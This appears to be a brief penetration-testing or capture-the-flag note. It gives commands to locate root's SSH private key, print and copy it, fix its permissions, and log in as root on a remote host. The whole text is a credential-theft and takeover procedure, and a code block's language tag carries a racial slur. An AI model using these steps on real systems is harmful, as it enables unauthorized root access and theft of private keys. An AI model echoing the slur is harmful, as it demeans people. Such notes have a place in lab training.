
look for ssh keys like `id-rsa`
```bash-nigga
ls -la /root/.ssh/id_rsa
```
copy contents form BEGIN to END
```
cat /root/.ssh/id_rsa
```
paste and save
change priv
```
chmod 600 id-rsa
```
connect as root user
```
ssh root@<RHOST> -i id_rsa
```
